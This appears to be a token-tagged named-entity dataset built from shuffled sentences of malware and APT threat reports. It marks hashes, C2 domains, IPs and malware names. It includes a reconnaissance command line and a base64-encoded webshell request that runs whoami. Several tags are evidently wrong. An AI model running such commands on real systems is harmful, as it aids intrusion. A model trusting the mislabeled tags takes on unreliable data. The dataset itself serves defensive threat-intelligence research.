6b557c22ab12e8ea43d29e4f9f8a9483e3e75cd41338a674c9069b6dacdf7ba7	B-hash
C2	O
:	O
question.eboregi.com	B-url.unknown
SHA256	O
:	O
7ade616a8f1750cecba944a02e2bce1340b18a55697b29f721ccc4701aadba6e	B-hash
C2	O
:	O
links.dogsforhelp.com	B-url.unknown
SHA256	O
:	O
88184983733f4d4fa767ad4e7993b01c5754f868470dd78ac1bad2b02c9e5001	B-hash
C2	O
:	O
here.pechooin.com	B-url.unknown
SHA256	O
:	O
b9d597aea53023727d8564e47e903b652f5e98a2c32bdc23bc4936448fb2d593	B-hash
C2	O
:	O
question.eboregi.com	B-url.unknown
SHA256	O
:	O
e0b3cc07d3a9b509480b240368dee2a29713ea1e240674c0ccf610c84810a7c5	B-hash
C2	O
:	O
question.eboregi.com	B-url.unknown
Filename	O
:	O
xpsfiltsvcs.txt	O
SHA256	O
:	O
f4b8f71c0e10a345a855763e01033e2144e949c8f98c271755cc025e3f55b7da	B-hash
C2	O
:	O
three.earewq.com	B-url.unknown
SHA256	O
:	O
2e00a98212c5a2015d12612f0d26039a0c2dfee3e1b384675f613e683f276e02	B-hash
C2	O
:	O
bakler.featurvoice.com	B-url.unknown
Filename	O
:	O
xpsfiltsvcs.dll	O
SHA256	O
:	O
42ed2edc37b957266ff7b02955a007dd82d955c09ef7be23e685d938e40ad61d	B-hash
C2	O
:	O
turber.xoxcobbs.com	B-url.unknown
Filename	O
:	O
xpsfiltsvcs.dll	O
SHA256	O
:	O
9b9cc7e2a2481b0472721e6b87f1eba4faf2d419d1e2c115a91ab7e7e6fc7f7c	B-hash
C2	O
:	O
happy.launchtrue.com	B-url.unknown
SHA256	O
:	O
a330c52b7643de9d8be51a4ae0150b7b8390dbabaea9704069694835fbd3298e	B-hash
C2	O
:	O
three.earewq.com	B-url.unknown
SHA256	O
:	O
a8fa487d9f2152738bf49c8c69e8a147aae55c06f37c7e25026a28f21601ad7f	B-hash
C2	O
:	O
sarey.phdreport.com	B-url.unknown
SHA256	O
:	O
c99c0b37f2fd64fa523d39c35ead6416a684ae203ae728feb5feff8490eb902c	B-hash
C2	O
:	O
help.ubxpi0s.com	B-url.unknown
SHA256	O
:	O
d541280b37dd5e2101cc5cd47b0991b8320714f5627b37646330136cddef0c23	B-hash
C2	O
:	O
three.earewq.com	B-url.unknown
Filename	O
:	O
coyote_load.dll	O
SHA256	O
:	O
adb05c1eecd789582886b3354b53831df9c9a06e891bb687633ee7ce21417edc	B-hash
C2	O
:	O
bakler.featurvoice.com	B-url.unknown

This	O
app	O
also	O
leverages	O
private	O
frameworks	O
to	O
read	O
the	O
SMS	O
messages	O
on	O
the	O
device	O
it	O
is	O
installed	O
on	O
and	O
uploads	O
these	O
to	O
the	O
C2	O
server	O
.	O

However	O
,	O
the	O
following	O
email	O
domains	O
do	O
not	O
use	O
Google	O
mail	O
servers	O
and	O
may	O
have	O
been	O
targeted	O
by	O
other	O
means	O
:	O
gop.com	B-url.unknown
—	O
used	O
by	O
the	O
Republican	O
National	O
Committee	O
donaldjtrump.com	B-url.unknown
—	O
used	O
by	O
the	O
Donald	O
Trump	O
campaign	O
johnkasich.com	B-url.unknown
—	O
used	O
by	O
the	O
John	O
Kasich	O
campaign	O
Access	O
to	O
targets	O
'	O
Google	O
accounts	O
allows	O
TG-4127	B-malware.infosteal
to	O
review	O
internal	O
emails	O
and	O
potentially	O
access	O
other	O
Google	O
Apps	O
services	O
used	O
by	O
these	O
organizations	O
,	O
such	O
as	O
Google	O
Drive	O
.	O

Delete	O
files	O
using	O
the	O
DeleteFile	O
(	O
)	O
API	O
Load	O
an	O
arbitrary	O
library	O
into	O
its	O
process	O
space	O
.	O

While	O
the	O
payload	O
is	O
running	O
,	O
Word	O
will	O
release	O
three	O
DLL	O
backdoors	O
locally	O
.	O

We	O
identified	O
from	O
the	O
compiler-generated	O
meta-data	O
that	O
the	O
version	O
the	O
sample	O
is	O
linked	O
to	O
is	O
openssl-1.0.1l-i386-win	O
.	O

Web	O
.	O

They	O
combine	O
reconnaissance	O
of	O
GPO	O
(	O
Group	O
Policy	O
Object	O
management	O
for	O
execution	O
)	O
with	O
digitally­signed	O
malware	O
to	O
avoid	O
detection	O
or	O
blocking	O
during	O
their	O
infection	O
phases	O
.	O

All	O
of	O
our	O
solutions	O
are	O
powered	O
by	O
cloud-based	O
global	O
threat	O
intelligence	O
,	O
the	O
Trend	O
MicroTM	O
Smart	O
Protection	O
NetworkTM	O
,	O
and	O
are	O
supported	O
by	O
over	O
1,200	O
threat	O
experts	O
around	O
the	O
globe	O
.	O

Function	O
EncryptData_sub_49D9EC	O
(	O
)	O

Figure	O
4	O
–	O
Disassembled	O
code	O
of	O
the	O
Win32/TeleBot.AB	B-malware.backdoor
trojan	O
.	O

The	O
production	O
and	O
sale	O
on	O
the	O
black	O
market	O
has	O
increased	O
exponentially	O
in	O
recent	O
years	O
,	O
developing	O
into	O
a	O
criminal	O
industry	O
that	O
is	O
placing	O
online	O
commerce	O
,	O
as	O
well	O
as	O
national	O
security	O
,	O
at	O
growing	O
risk	O
.	O

Microsoft	O
's	O
official	O
security	O
patch	O
was	O
released	O
on	O
8th	O
May	O
.	O

Share	O
post	O
on	O
:	O
Your	O
e	O
mail	O
addre	O
ss	O
will	O
not	O
be	O
publishe	O
d.	O
Re	O
quire	O
d	O
fie	O
lds	O
are	O
marke	O
d	O
*	O
Ente	O
r	O
your	O
comme	O
nt	O
he	O
re	O
Name	O
*	O
Email	O
*	O
Save	O
my	O
name	O
,	O
e	O
mail	O
,	O
and	O
we	O
bsite	O
in	O
this	O
browse	O
r	O
for	O
the	O
ne	O
xt	O
time	O
I	O
comme	O
nt	O
.	O

In	O
addition	O
,	O
using	O
the	O
communication	O
pattern	O
we	O
were	O
able	O
to	O
find	O
another	O
sample	O
called	O
'	O
DriverInstallerU	B-malware.drop
'	O
.	O

PHPMailer	O
–	O
a	O
mail	O
sending	O
tool	O
.	O

Working	O
with	O
the	O
asset	O
owner	O
,	O
Mandiant	O
ran	O
trilog.exe	O
in	O
a	O
lab	O
environment	O
with	O
a	O
valid	O
Triconex	B-malware.unknown
controller	O
and	O
discovered	O
a	O
conditional	O
check	O
in	O
the	O
malware	O
that	O
prevented	O
the	O
payload	O
binary	O
from	O
persisting	O
in	O
the	O
environment	O
.	O

The	O
attacker	O
tried	O
to	O
mimic	O
Russian	O
hackers	O
by	O
using	O
mail.ru	O
email	O
.	O

On	O
the	O
other	O
hand	O
,	O
it	O
is	O
not	O
that	O
hard	O
to	O
enter	O
arbitrary	O
registration	O
information	O
and	O
misdirect	O
investigators	O
to	O
an	O
obvious	O
North	O
Korean	O
origin	O
.	O

An	O
error	O
message	O
pops	O
up	O
stating	O
that	O
the	O
user	O
's	O
computer	O
was	O
infected	O
by	O
a	O
virus	O
and	O
that	O
for	O
security	O
reasons	O
they	O
need	O
to	O
apply	O
for	O
a	O
fraud	O
prevention	O
service	O
.	O

Home	O
'	O
Targeted	O
Attacks	O
'	O
New	O
MacOS	O
Backdoor	O
Linked	O
to	O
OceanLotus	O
Found	O
April	O
4	O
,	O
2018	O
at	O
9:00	O
am	O
Targeted	O
Attacks	O
Jaromir	O
Horejsi	O
(	O
Threat	O
Researcher	O
)	O

Server	O
Uranio3	O

This	O
sample	O
was	O
compiled	O
in	O
December	O
2016	O
.	O

If	O
an	O
IP	O
address	O
is	O
resolved	O
for	O
this	O
particular	O
domain	O
,	O
then	O
the	O
malware	O
tries	O
to	O
establish	O
a	O
connection	O
on	O
TCP	O
port	O
25123	O
.	O

This	O
is	O
achieved	O
by	O
loading	O
the	O
Babar	B-malware.drop
DLL	O
to	O
remote	O
processes	O
through	O
a	O
mapped	O
memory	O
object	O
.	O

Putting	O
everything	O
together	O
into	O
a	O
complete	O
DarkComet	B-malware.backdoor
crypto	O
module	O
yields	O
the	O
following	O
Python	O
script	O
:	O

For	O
additional	O
mitigation	O
steps	O
and	O
more	O
detailed	O
information	O
,	O
please	O
reach	O
out	O
to	O
your	O
Accenture	O
contact	O
.	O

Further	O
analysis	O
lead	O
to	O
even	O
more	O
suspicion	O
,	O
and	O
those	O
suspicions	O
grew	O
even	O
stronger	O
as	O
they	O
watched	O
another	O
comparable	O
domain	O
created	O
,	O
CBIUAEBN.COM	B-url.cncsvr
.	O

The	O
user	O
agent	O
is	O
always	O

Actual	O
strings	O
are	O
shared	O
in	O
the	O
appendix	O
information	O
at	O
the	O
end	O
of	O
this	O
blog	O
.	O

'	O
cambio	O
'	O
is	O
Spanish	O
for	O
'	O
change	O
'	O
.	O

Of	O
course	O
a	O
non­French	O
speaking	O
developer	O
could	O
have	O
deliberately	O
set	O
this	O
value	O
to	O
mislead	O
attribution	O
efforts	O
.	O

Custom-built	O
backdoors	O
-	O
The	O
threat	O
actor	O
used	O
very	O
sophisticated	O
and	O
stealthy	O
backdoors	O
(	O
Denis	B-malware.backdoor
&	O
Goopy	B-malware.backdoor
)	O
that	O
were	O
written	O
by	O
highly	O
skilled	O
malware	O
authors	O
.	O

-קרפ	O
ז	O
םירוויעל	O
הבהא	O
קחשמ	O

This	O
code	O
meant	O
that	O
visitors	O
were	O
potentially	O
subjected	O
to	O
exploit	O
and	O
malicious	O
Java	O
Applets	O
designed	O
to	O
install	O
malware	O
on	O
their	O
systems	O
.	O

29	O
Dec	O
.	O

However	O
,	O
estimating	O
the	O
number	O
of	O
victims	O
this	O
way	O
is	O
difficult	O
due	O
to	O
DHCP	O
lease	O
times	O
,	O
which	O
inflate	O
the	O
numbers	O
,	O
and	O
NAT	O
connections	O
,	O
which	O
deflate	O
the	O
numbers	O
.	O

All	O
rights	O
reserved	O
.	O

Both	O
are	O
parted	O
by	O
the	O
characters	O
'	O
<	O
'	O
or	O
'	O
>	O
'	O
depending	O
on	O
the	O
direction	O
of	O
the	O
conversation	O
.	O

Advanced	O
persistent	O
threats	O
will	O
remain	O
a	O
problem	O
for	O
companies	O
and	O
organizations	O
of	O
all	O
sizes	O
,	O
especially	O
those	O
with	O
high	O
financial	O
or	O
intellectual	O
property	O
value	O
.	O

PCC_PROXY	O
:	O
:fNetworkEnabled	O
flag	O
is	O
set	O
to	O
true	O
,	O
PRC_PROXY	O
:	O
:MainThread	O
will	O
loop	O
through	O
all	O
active	O
channels	O
,	O
perform	O
a	O
select	O
on	O
the	O
socket	O
connected	O
to	O
the	O
endpoint	O
and	O
--	O
if	O
the	O
select	O
indicates	O
that	O
there	O
is	O
data	O
waiting	O
on	O
a	O
particular	O
socket	O
--	O
the	O
data	O
is	O
read	O
.	O

Those	O
tasks	O
are	O
Dino	B-malware.backdoor
's	O
commands	O
.	O

What	O
exactly	O
is	O
the	O
Poseidon	B-malware.infosteal
Group	O
?	O

The	O
IP	O
address	O
in	O
the	O
lateral	O
movement	O
techniques	O
was	O
substituted	O
with	O
the	O
local	O
machine	O
IP	O
address	O
to	O
achieve	O
code	O
execution	O
on	O
the	O
system	O
.	O

•	O
10.49	O
.	O

A	O
200.63.46.23	B-ip.unknown
7	O
www.babylearningdvd.com	B-url.unknown
.	O

However	O
,	O
it	O
does	O
not	O
have	O
any	O
functionality	O
,	O
and	O
when	O
clicked	O
,	O
this	O
error	O
message	O
is	O
displayed	O
:	O
Sorry	O
,	O
this	O
version	O
is	O
not	O
compatible	O
with	O
your	O
android	O
version	O
.	O

Today	O
we	O
'll	O
be	O
diving	O
deep	O
into	O
the	O
details	O
of	O
DarkComet	B-malware.backdoor
's	O
crypto	O
.	O

All	O
rights	O
reserved	O
.	O

Its	O
communication	O
relies	O
on	O
a	O
payload	O
in	O
the	O
form	O
of	O
a	O
small	O
Web	O
application	O
.	O

The	O
code	O
also	O
makes	O
extensive	O
use	O
of	O
the	O
multi-byte	O
NOP	O
operation	O
prefixed	O
by	O
0x0F1F	O
.	O

getAgentID	O
]	O

?	O
?	O

The	O
shellcode	O
retrieves	O
three	O
Windows	O
API	O
functions	O
:	O
VirtualAlloc	O
,	O
RtlMoveMemory	O
and	O
RtlZeroMemory	O
.	O

File	O
Metadata	O

(	O
SHA1	O
:	O
912895e6bb9e05af3a1e58a1da417e992a71a324	B-hash
)	O
file	O
is	O
written	O
into	O
the	O
%	O
temp	O
%	O
folder	O
and	O
run	O
via	O
Win32	O
API	O
function	O
ShellExecute	O
.	O

We	O
have	O
seen	O
similar	O
.SCR	O
files	O
with	O
following	O
filenames	O
:	O
scr	O
(	O
Alfabank	O
contract	O
)	O
04.08.2015	O
scr	O
(	O
List	O
to	O
block	O
)	O
Postanovlene_ob_ustranenii_18.08.2015.pdf	O
%	O
LOTS_OF_SPACES	O
%	O
..scr	O
06.08.2015.pdf	O
%	O
LOTS_OF_SPACES	O
%	O
.scr	O
(	O
Rules	O
of	O
Bank	O
of	O
Russia	O
)	O
All	O
these	O
attachments	O
contained	O
a	O
password	O
protected	O
archive	O
with	O
.SCR	O
file	O
.	O

Interestingly	O
,	O
the	O
basic	O
payload	O
is	O
n't	O
provided	O
with	O
the	O
code	O
to	O
perform	O
any	O
significant	O
action	O
.	O

Introduction	O
Discovered	O
Samples	O
'	O
87bffb037	O
0c9e14ed5d01d6cc0747cb30a544a71345ea68ef235320378f582ef.exe	O
'	O
'	O
15486216ab9c8b474fe8a773fc46bb37a19c6af47d5bd50f5670cd9950a7207c.exe	O
'	O
'	O
e7dd9678b0a1c4881e80230ac716b21a41757648d71c538417755521438576f6.exe	O
'	O
'	O
e53bd956c4ef7	O
9d54b4860e74c68e6d93a49008034afb42b092ea19344309914.exe	O
'	O
'	O
sdbn.dll	O
'	O
'	O
upnphost.exe	O
'	O
The	O
same	O
malware	O
behind	O
four	O
executables	O
upnphost.exe	O
Our	O
submission	O
to	O
VirusTotal	O
AutoIt	O
Script	O
sdbn.dll	O
The	O
attack	O
threat	O
map	O
Yara	O
rules	O

46d1d1f6e396a1908471e8a8d8b38417	B-hash
6b061267c7ddeb160368128a933d38be	B-hash
afa40517d264d1b03ac5c4d2fef8fc32	B-hash
c270eb96deaf27dd2598bc4e9afd99da	B-hash
d897b4b8e729a408f64911524e8647db	B-hash
e1cc2dcb40e729b2b61cf436d20d8ee5	B-hash

During	O
our	O
Winnti	O
research	O
,	O
we	O
learnt	O
that	O
one	O
of	O
the	O
Korean	O
victims	O
was	O
severely	O
criticized	O
by	O
South	O
Korean	O
regulators	O
for	O
using	O
foreign	O
security	O
products	O
.	O

After	O
executing	O
the	O
file	O
,	O
it	O
contacts	O
the	O
IP	O
'	O
45.124.132.127	B-ip.unknown
'	O
where	O
it	O
sends	O
periodically	O
some	O
information	O
gathered	O
on	O
the	O
operative	O
system	O
,	O
using	O
the	O
command	O
line	O
'	O
cmd.exe	O
/c	O
tasklist	O
&	O
systeminfo	O
'	O
.	O

In	O
February	O
2013	O
,	O
Privacy	O
International	O
,	O
the	O
European	O
Centre	O
for	O
Constitutional	O
and	O
Human	O
Rights	O
(	O
ECCHR	O
)	O
,	O
the	O
Bahrain	O
Center	O
for	O
Human	O
Rights	O
,	O
Bahrain	O
Watch	O
,	O
and	O
Reporters	O
Without	O
Borders	O
filed	O
a	O
complaint	O
with	O
the	O
Organization	O
for	O
Economic	O
Cooperation	O
and	O
Development	O
(	O
OECD	O
)	O
,	O
requesting	O
that	O
this	O
body	O
investigate	O
whether	O
Gamma	O
violated	O
OECD	O
Guidelines	O
for	O
Multinational	O
Enterprises	O
by	O
exporting	O
FinSpy	B-malware.backdoor
to	O
Bahrain	O
.	O

Some	O
of	O
the	O
samples	O
exhibit	O
clear	O
evidence	O
of	O
targeting	O
Vietnamese	O
entities	O
.	O

North	O
Korea	O
continued	O
to	O
target	O
South	O
Korea	O
through	O
late	O
2017	O
with	O
a	O
spear	O
phishing	O
campaign	O
against	O
both	O
cryptocurrency	O
users	O
and	O
exchanges	O
,	O
as	O
well	O
as	O
South	O
Korean	O
college	O
students	O
interested	O
in	O
foreign	O
affairs	O
.	O

Change	O
the	O
C	O
&	O
C	O
URL	O
to	O
a	O
given	O
value	O
.	O

x509	O
fingerprint	O

When	O
manually	O
extracting	O
this	O
file	O
,	O
it	O
can	O
be	O
seen	O
to	O
represent	O
a	O
pixelated	O
bitmap	O
(	O
BMP	O
)	O
file	O
.	O

Hypothesis	O
6	O
:	O
An	O
unidentified	O
Indian	O
entity	O
developed	O
and	O
used	O
this	O
malware	O
as	O
a	O
realistic	O
simulated	O
exercise	O
to	O
perform	O
penetration	O
testing	O
and	O
evaluate	O
their	O
readiness	O
in	O
the	O
event	O
of	O
actual	O
Pakistani	O
affiliated	O
offensive	O
network	O
operations	O
.	O

The	O
backdoor	O
connects	O
to	O
a	O
command	O
and	O
control	O
server	O
at	O
icc[.]ignorelist[.]com	B-url.cncsvr
.	O

Currently	O
,	O
the	O
same	O
binary	O
does	O
n't	O
seem	O
to	O
be	O
available	O
in	O
any	O
other	O
malware	O
repository	O
to	O
which	O
we	O
have	O
access	O
.	O

It	O
turns	O
out	O
that	O
the	O
compromised	O
sites	O
served	O
Win32/Spy.Agent.ORM	B-malware.infosteal
.	O

The	O
majority	O
of	O
the	O
Ham	B-malware.backdoor
Backdoors	I-malware.backdoor
found	O
to	O
date	O
have	O
all	O
been	O
signed	O
using	O
the	O
stolen	O
and	O
leaked	O
Hacking	O
Team	O
code-signing	O
certificate	O
.	O

Currently	O
,	O
APT12	O
continues	O
to	O
target	O
organizations	O
and	O
conduct	O
cyber	O
operations	O
using	O
its	O
new	O
tools	O
.	O

The	O
executables	O
are	O
also	O
often	O
digitally	O
signed	O
and	O
occasionally	O
hidden	O
in	O
alternate	O
data	O
streams	O
to	O
fool	O
security	O
solutions	O
.	O

The	O
 rst	O
column	O
shows	O
the	O
hash	O
of	O
the	O
submitter	O
.	O

As	O
we	O
said	O
,	O
the	O
Team	O
Viewer	O
components	O
used	O
in	O
this	O
campaign	O
are	O
not	O
the	O
original	O
ones	O
.	O

&	O
z1=Y21k	B-hash
&	I-hash
z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZ	I-hash
jZCZlY2hvIFtFXQ	I-hash
%	I-hash
3D	I-hash
%	I-hash
3D	I-hash

For	O
prevention	O
and	O
mitigation	O
strategies	O
against	O
XSS	O
,	O
see	O
US-CERT	O
's	O
Alert	O
on	O
Compromised	O
Web	O
Servers	O
and	O
Web	O
Shells	O
.	O

It	O
can	O
also	O
display	O
a	O
fake	O
Windows	O
Update	O
whenever	O
there	O
is	O
nefarious	O
activity	O
in	O
the	O
background	O
,	O
as	O
seen	O
in	O
Figure	O
23	O
.	O

The	O
encrypted	O
data	O
has	O
two	O
layers	O
of	O
abstraction	O
.	O

APT32	B-malware.infosteal
operations	O
are	O
characterized	O
through	O
deployment	O
of	O
signature	O
malware	O
payloads	O
including	O
WINDSHIELD	O
,	O
KOMPROGO	O
,	O
SOUNDBITE	O
,	O
and	O
PHOREAL	O
.	O

DllRegisterServer	O
function	O
,	O
among	O
other	O
tasks	O
,	O
will	O
attempt	O
to	O
install	O
the	O
server	O
variant	O
as	O
a	O
server	O
on	O
the	O
victim	O
's	O
machine	O
.	O

To	O
avoid	O
being	O
discovered	O
,	O
the	O
malware	O
authors	O
used	O
these	O
techniques	O
:	O

Snort	O
Signatures	O
–	O
TLP	O
WHITE	O

fe0161fb8a26a0bf4afad746c7ebf89499dcd3a7	B-hash
032ef58b7978d079287874044dc516af624ae5f5	B-hash
2a387d7d47a63d6e47d9cc92d3dc69a53816c2c0	B-hash
7105caa6d4fd8a2c67523d385277528e556ae4f6	B-hash
f96bcd875836da89800912de1e557891697c7cf4	B-hash
Chi	O
tiet	O
don	O
khieu	O
nai	O
gui	O
saigontel.exe	O

Figure	O
9	O
Shellcode	O
that	O
started	O
with	O
MZ	O
(	O
4D	O
5A	O
)	O

The	O
Poseidon	B-malware.infosteal
Group	O
is	O
a	O
long­running	O
team	O
operating	O
on	O
all	O
domains	O
:	O
land	O
,	O
air	O
,	O
and	O
sea	O
.	O

29	O
Dec	O
.	O

Here	O
is	O
a	O
non-exhaustive	O
list	O
of	O
ZxShell	B-malware.backdoor
samples	O
that	O
were	O
analyzed	O
for	O
this	O
report	O
.	O

Once	O
executed	O
on	O
the	O
machine	O
,	O
the	O
code	O
will	O
deliver	O
one	O
of	O
a	O
number	O
of	O
sophisticated	O
Remote	O
Access	O
Tools	O
(	O
RATs	B-malware.infosteal
)	O
,	O
including	O
AdobeARM	O
,	O
ATI-Agent	O
,	O
and	O
MiniDionis	B-malware.unknown
.	O

Note	O
the	O
form	O
of	O
the	O
HTTP	O
requests	O
used	O
by	O
this	O
AutoIt	O
malware	O
:	O
http://server/folder/online.php?sysname=.	O

ACKNOWLEDGEMENTS	O

The	O
compiled	O
droppers	O
contain	O
PyInstaller	O
artifacts	O
from	O
the	O
system	O
the	O
executables	O
were	O
created	O
on	O
.	O

In	O
some	O
deployments	O
,	O
we	O
observed	O
Sofacy	O
actively	O
developing	O
and	O
deploying	O
a	O
new	O
package	O
to	O
a	O
much	O
smaller	O
,	O
specific	O
subset	O
of	O
targets	O
within	O
the	O
broader	O
set	O
.	O

The	O
following	O
other	O
domains	O
were	O
seen	O
resolving	O
to	O
this	O
same	O
IP	O
:	O

In	O
September	O
of	O
last	O
year	O
,	O
the	O
German	O
foreign	O
minister	O
,	O
Guido	O
Westerwelle	O
,	O
called	O
for	O
an	O
EU-wide	O
ban	O
on	O
the	O
export	O
of	O
such	O
surveillance	O
software	O
to	O
totalitarian	O
states	O
.	O

Someone	O
,	O
who	O
claims	O
not	O
to	O
be	O
the	O
author	O
of	O
the	O
malware	O
,	O
promoted	O
the	O
malware	O
with	O
a	O
kind	O
of	O
banner	O
which	O
has	O
quite	O
a	O
visual	O
impact	O
.	O

The	O
targeted	O
systems	O
provided	O
emergency	O
shutdown	O
capability	O
for	O
industrial	O
processes	O
.	O

When	O
executed	O
the	O
exploit	O
initially	O
creates	O
and	O
launches	O
a	O
dropper	O
at	O
location	O
%	O
Temp%\svchost.exe	O

Figure	O
7	O
:	O
Network	O
Communication	O
observed	O
during	O
analysis	O
Figure	O
8	O
:	O
Network	O
trace	O
of	O
HTTP	O
Requests	O
The	O
weaponized	O
document	O
(	O
Figure	O
9	O
)	O
,	O
titled	O
'	O
.xlsx	O
'	O
(	O
translated	O
to	O
'	O
basic_salary	O
'	O
)	O
,	O
is	O
an	O
Arabic	O
language	O
themed	O
document	O
that	O
purports	O
to	O
inform	O
the	O
target	O
of	O
employee	O
salary	O
adjustments	O
.	O

Politico	O
.	O

The	O
document	O
contains	O
an	O
embedded	O
Flash	O
script	O
that	O
exploits	O
CVE-2018-4878	O
and	O
downloads	O
and	O
executes	O
the	O
DLL	O
implant	O
from	O
falcancoin.io	O
.	O

'	O
Server	O
'	O
,	O
'	O
Servers	O
'	O
,	O
and	O
'	O
–	O
(	O
(	O
Mutex	O
)	O
)	O
–	O
'	O
are	O
the	O
defaults	O
in	O
the	O
XtremeRAT	B-malware.backdoor
controller	O
for	O
ID	O
,	O
Group	O
,	O
and	O
Mutex	O
respectively	O
.	O

McAfee	O
Policy	O
Auditor	O
SCAP	O
MNAC	O
SCAP	O

This	O
functionality	O
runs	O
in	O
a	O
loop	O
until	O
6am	O
on	O
6th	O
February	O
2016	O
.	O

A	O
screen	O
shot	O
of	O
the	O
webshell	O
as	O
observed	O
on	O
the	O
ATD	O
website	O
can	O
be	O
seen	O
below	O
.	O

We	O
were	O
able	O
to	O
ascertain	O
the	O
geographical	O
locations	O
of	O
the	O
two	O
attack	O
groups	O
by	O
analyzing	O
their	O
'	O
HTRAN	O
'	O
infrastructure	O
over	O
a	O
period	O
of	O
time	O
.	O

The	O
malware	O
system	O
apparently	O
includes	O
additional	O
components	O
that	O
have	O
not	O
been	O
identified	O
.	O

*Known	O
Duqu	B-malware.infosteal
drivers	O
have	O
unique	O
file	O
names	O
for	O
each	O
of	O
the	O
variants	O
.	O

We	O
present	O
these	O
updated	O
findings	O
in	O
the	O
hopes	O
that	O
we	O
will	O
further	O
encourage	O
civil	O
society	O
groups	O
and	O
competent	O
investigative	O
bodies	O
to	O
continue	O
their	O
scrutiny	O
of	O
Gamma	O
's	O
activities	O
,	O
relevant	O
export	O
control	O
issues	O
,	O
and	O
the	O
issue	O
of	O
the	O
global	O
and	O
unregulated	O
proliferation	O
of	O
surveillance	O
malware	O
.	O

hxxps://www.eye-watch[.]in/design/fancybox/include/cambio.xap	B-url.cncsvr

The	O
other	O
decoy	O
document	O
is	O
contact	O
info	O
for	O
an	O
American	O
with	O
a	O
military	O
provided	O
email	O
address	O
from	O
Joint	O
Base	O
Andrews	O
in	O
Maryland	O
,	O
but	O
with	O
a	O
physical	O
address	O
in	O
Pakistan	O
titled	O
'	O
Family	O
Planning	O
Association	O
of	O
Base	O
(	O
FPAB	O
)	O
.	O
'	O

Among	O
the	O
attachment	O
types	O
are	O
:	O
Microsoft®	O
Excel®	O
spreadsheets	O
(	O
and	O
)	O
PDFs	O
(	O
)	O
Microsoft®	O
Word®	O
documents	O
(	O
)	O
A	O
.RAR	B-malware.drop
file	O
with	O
a	O
folder	O
named	O
was	O
also	O
seen	O
containing	O
malicious	O
code	O
.	O

The	O
script	O
proceeds	O
to	O
create	O
a	O
service	O
called	O
named	O
wmiapsrv.exe	O
that	O
runs	O
a	O
BitcoinMinerPooling	O
Application	O
.	O

1	O
*	O
HKCU\Software\Microsoft\ApplicationManager	O

More	O
interesting	O
than	O
the	O
malware	O
itself	O
though	O
is	O
the	O
path	O
to	O
the	O
associated	O
symbol	O
file	O
,	O
which	O
appears	O
embedded	O
in	O
the	O
dropper	O
.	O

The	O
memory	O
snapshot	O
of	O
the	O
process	O
will	O
not	O
disclose	O
many	O
more	O
details	O
than	O
the	O
static	O
binary	O
itself	O
.	O

It	O
could	O
be	O
through	O
physical	O
access	O
to	O
the	O
phones	O
,	O
or	O
by	O
using	O
social	O
engineering	O
,	O
motivating	O
the	O
user	O
to	O
enroll	O
their	O
device	O
.	O

주요	O
공격	O
방법은	O
매크로	O
(	O
Macro	O
)	O
를	O
이용한	O
스피어	O
피싱	O
(	O
Spear	O
Phishing	B-malware.drop
)	O
,	O
액티브X	O
(	O
Active-X	B-malware.drop
)	O
취약점을	O
이용한	O
워터링홀	O
,	O
보안	O
및	O
IT	O
자산	O
관리	O
시스템	O
취약점	O
공격	O
,	O
공급망	O
공격	O
등이다	O
.	O

Unit	O
42	O
is	O
aware	O
of	O
threat	O
actors	O
using	O
two	O
toolkits	O
–	O
MNKit	O
and	O
the	O
Tran	O
Duy	O
Linh	O
toolkit	O
–	O
to	O
produce	O
malicious	O
documents	O
that	O
exploit	O
CVE-2012-0158	O
in	O
order	O
to	O
implant	O
Cmstar	B-malware.unknown
.	O

The	O
first	O
substantive	O
operation	O
is	O
to	O
pass	O
the	O
raw	O
(	O
encrypted	O
)	O
source	O
buffer	O
src_buf_var_4	O
via	O
EAX	O
,	O
along	O
with	O
an	O
output	O
buffer	O
temp_buf_var_420	O
via	O
EDX	O
,	O
to	O
function	O

MNAC	O
2.x	O
McAfee	O
Remediation	O
The	O
MNAC	O
release	O
of	O
February	O
10	O
will	O
include	O
a	O
vulnerability	O
check	O
to	O
assess	O
if	O
your	O
systems	O
are	O
at	O
risk	O
.	O

The	O
changes	O
to	O
RIPTIDE	B-malware.backdoor
were	O
significant	O
enough	O
to	O
circumvent	O
existing	O
RIPTIDE	B-malware.backdoor
detection	O
rules	O
.	O

The	O
partition	O
was	O
added	O
,	O
the	O
MFT	O
read	O
,	O
and	O
the	O
file	O
system	O
appeared	O
:	O
With	O
the	O
file	O
system	O
restored	O
some	O
relevant	O
artifacts	O
can	O
be	O
located	O
now	O
,	O
and	O
an	O
actual	O
computer	O
forensic	O
examination	O
can	O
take	O
place	O
.	O

This	O
event	O
has	O
then	O
been	O
used	O
for	O
years	O
.	O

According	O
to	O
Microsoft	O
,	O
this	O
will	O
be	O
changing	O
with	O
its	O
Office	O
365	O
products	O
in	O
2019	O
.	O

T	O
he	O
websites	O
were	O
compromised	O
to	O
redirect	O
visitors	O
to	O
instances	O
of	O
both	O
ScanBox	O
and	O
BEeF	O
.	O

Understanding	O
that	O
the	O
present	O
tools	O
are	O
failing	O
at	O
an	O
alarming	O
rate	O
,	O
they	O
have	O
developed	O
methods	O
and	O
software	O
applications	O
which	O
seek	O
to	O
augment	O
,	O
rather	O
than	O
replace	O
,	O
existing	O
cyber-security	O
defenses	O
.	O

These	O
two	O
bytes	O
are	O
the	O
JNZ	O
opcode	O
,	O
briefly	O
explained	O
as	O
'	O
if	O
the	O
result	O
of	O
the	O
previous	O
comparison	O
operation	O
is	O
not	O
zero	O
,	O
then	O
jump	O
into	O
the	O
address	O
that	O
follows	O
this	O
instruction	O
,	O
plus	O
4	O
bytes'.Essentially	O
,	O
this	O
opcode	O
is	O
a	O
conditional	O
jump	O
instruction	O
that	O
follows	O
some	O
important	O
check	O
,	O
such	O
as	O
a	O
key	O
validity	O
check	O
or	O
authorisation	O
success	O
check	O
.	O

down	O

The	O
ones	O
that	O
still	O
resolve	O
to	O
the	O
IP	O
are	O
listed	O
below	O
:	O

By	O
all	O
appearances	O
,	O
this	O
is	O
a	O
mistake	O
by	O
the	O
malware	O
author	O
.	O

It	O
is	O
preferable	O
if	O
the	O
image	O
file	O
is	O
a	O
raw	O
image	O
as	O
they	O
are	O
easier	O
to	O
edit	O
then	O
other	O
image	O
file	O
formats	O
.	O

It	O
may	O
take	O
time	O
for	O
your	O
organization	O
's	O
IT	O
professionals	O
to	O
isolate	O
and	O
remove	O
threats	O
to	O
your	O
systems	O
and	O
restore	O
normal	O
operations	O
.	O

The	O
dropped	O
file	O
was	O
analyzed	O
in	O
an	O
isolated	O
environment	O
(	O
